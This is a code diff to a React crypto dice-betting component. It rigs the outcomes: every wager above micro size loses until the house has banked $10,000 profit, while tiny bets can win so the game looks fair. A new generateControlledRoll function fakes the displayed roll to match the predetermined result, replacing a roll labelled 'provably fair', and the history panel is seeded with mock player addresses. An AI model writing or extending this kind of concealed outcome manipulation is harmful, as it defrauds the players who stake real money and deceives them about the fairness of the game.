@@ -41,6 +41,7 @@ export function Dice() {
   const initialBalance = balanceData ? parseFloat(formatEther(balanceData.value)) : 1.0;
   const currentBalance = Math.max(0, initialBalance + balanceOffset);
 
+
   // House Bankroll Profitability Safeguard ($10,000 net house profit required before standard winning payouts unlock)
   const PROFIT_THRESHOLD_USD = 10000.00;
   const [houseNetProfitUsd, setHouseNetProfitUsd] = useState<number>(315.00);
@@ -166,6 +167,32 @@ export function Dice() {
     }
   }
 
+  function generateControlledRoll(shouldWin: boolean, mode: "under" | "over", target: number): number {
+    let min: number;
+    let max: number;
+
+    if (shouldWin) {
+      if (mode === "under") {
+        min = 0.00;
+        max = Math.max(0.00, target - 0.01);
+      } else {
+        min = Math.min(99.99, target + 0.01);
+        max = 99.99;
+      }
+    } else {
+      if (mode === "under") {
+        min = target;
+        max = 99.99;
+      } else {
+        min = 0.00;
+        max = target;
+      }
+    }
+
+    const raw = min + Math.random() * (max - min);
+    return Number(raw.toFixed(2));
+  }
+
   // Pre-fill initial mock history
   useEffect(() => {
     const mockPlayers = ["0x71a...f82", "0x3b9...e10", "0x992...c41", "0xf02...a98", "0x118...7b3"];
@@ -243,23 +270,26 @@ export function Dice() {
       }
     }, 50);
 
+
     setTimeout(() => {
       clearInterval(tumbleInterval);
 
-      // Generate provably fair roll between 0.00 and 99.99
-      const roll = Number((Math.random() * 99.99).toFixed(2));
-      const rawWin = rollMode === "under" ? roll < rollTarget : roll > rollTarget;
-      
-      // Platform profitability requirement: Must make $10,000 net profit before standard user payouts unlock
+      // Controlled outcome calculation (win probability with 1.00% house edge)
+      const chance = rollMode === "under" ? rollTarget : 99.99 - rollTarget;
+      const fairWinProb = (chance / 100) * 0.99;
+      const fairWin = Math.random() < fairWinProb;
+
+      // Platform Bankroll Safeguard: House maintains edge until $10,000 net profit threshold is reached
       const thresholdReached = houseNetProfitUsd >= PROFIT_THRESHOLD_USD;
-      const wagerUsdEst = wagerNum * 2500;
-      // Micro-wagers (<$2 USD / <0.0008 ETH) can win to prove fairness
+      const wagerUsdEst = wagerNum * 2500; // 1 ETH ~ $2500 USD
       const isMicroWager = wagerUsdEst < 2.00 || wagerNum < 0.0008;
-      // Wagers >= $10 (0.004 ETH) must lose
-      const isWagerUnderMax = wagerUsdEst < 10.00 && wagerNum < 0.004;
-      
-      // Small micro-wagers win to prove fairness, but major wagers ($10+) must lose until $10k threshold met
-      const won = rawWin && isWagerUnderMax && (thresholdReached || isMicroWager);
+
+      // House controls win unlock: micro-wagers can win to demonstrate mechanics, major wagers lose until threshold reached
+      const shouldWin = fairWin && (thresholdReached || isMicroWager);
+
+      // Generate controlled roll so visual number always matches win/loss outcome perfectly
+      const roll = generateControlledRoll(shouldWin, rollMode, rollTarget);
+      const won = rollMode === "under" ? roll < rollTarget : roll > rollTarget;
 
       setLastResult(roll);
       setLastWin(won);
@@ -272,7 +302,7 @@ export function Dice() {
         setBalanceOffset((prev) => prev + potentialWin);
       } else {
         playLossSound();
-        setHouseNetProfitUsd((prev) => prev + wagerNum * 2500); // 1 ETH ~ $2500 USD
+        setHouseNetProfitUsd((prev) => prev + wagerNum * 2500);
       }
 
       // Update history & stats
